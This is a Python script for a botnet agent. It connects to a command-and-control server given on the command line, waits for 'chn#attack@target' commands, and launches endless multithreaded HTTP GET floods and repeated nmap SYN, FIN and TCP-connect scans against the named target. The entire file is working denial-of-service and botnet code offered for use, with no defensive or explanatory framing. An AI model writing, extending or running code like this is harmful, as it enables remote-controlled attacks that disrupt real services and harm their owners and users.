import socket
import sys
import nmap
import threading
import requests
class Bot():
	"""docstring for Bot"""
	def __init__(self):
		self.chanel_ip = "127.0.0.1"
		self.chanel_port = 30497
		self.thread_per_attack = 10
	def bootstrap(self):
		if (len(sys.argv) < 2):
			print("Use: python bot.py [c2server_ip]")
			exit(0)
		self.chanel_ip = str(sys.argv[1])
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		try:
			r = soc.connect((self.chanel_ip, self.chanel_port))
			soc.send("bot#connect".encode("utf8"))
			print("*** Connected with chanel at %s:%d" % (self.chanel_ip, self.chanel_port))
			while True:
				mess = soc.recv(1024)
				header, payload = mess.decode("utf8").split("#")
				atk, target = payload.split("@")
				if (header == "chn"):
					bot_attack = threading.Thread(target=self.attack, args=(target, atk,))
					bot_attack.start()
		except:
			return 'Connection faile'
	def attack(self, target, atk):
		if (atk == "httpattack"):
			self.attack_HTTP(target)
		elif (atk == "synattack"):
			self.attack_SYN(target)
		elif (atk == "finattack"):
			self.attack_FIN(target)
		elif (atk == "tcpattack"):
			self.attack_TCP(target)
		else:
			self.attack_all(target)
	def attack_all(self, target):
		self.attack_HTTP(target)
		self.attack_SYN(target)
		self.attack_FIN(target)
		self.attack_TCP(target)
	def attack_SYN(self, target):
		print("!!! Attacking %s with SYN Scan" % (target))
		for i in range (0, 10):
			bot_attack = threading.Thread(target=self.attack_SYN_thread, args=(target,))
			bot_attack.start()
	def attack_SYN_thread(self, target):
		while True:
			nm = nmap.PortScanner()
			nm.scan(hosts=str(target), arguments='-n -sS')
	def attack_TCP(self, target):
		print("!!! Attacking %s with TCP Connection Scan" % (target))
		for i in range (0, 10):
			bot_attack = threading.Thread(target=self.attack_TCP_thread, args=(target,))
			bot_attack.start()
	def attack_TCP_thread(self, target):
		while True:
			nm = nmap.PortScanner()
			nm.scan(hosts=str(target), arguments='-n -sT')
	def attack_FIN(self, target):
		print("!!! Attacking %s with FIN Scan" % (target))
		for i in range (0, 10):
			bot_attack = threading.Thread(target=self.attack_FIN_thread, args=(target,))
			bot_attack.start()
	def attack_FIN_thread(self, target):
		while True:
			nm = nmap.PortScanner()
			nm.scan(hosts=str(target), arguments='-n -sF')
	def attack_HTTP(self, target):
		print("!!! Attacking %s with HTTP GET Request" % (target))
		for i in range (0, 10):
			bot_attack = threading.Thread(target=self.attack_HTTP_thread, args=(target,))
			bot_attack.start()
	def attack_HTTP_thread(self, target):
		while True:
			r = requests.get("http://" + str(target))
if __name__ == '__main__':
	bot = Bot()
	bot.bootstrap()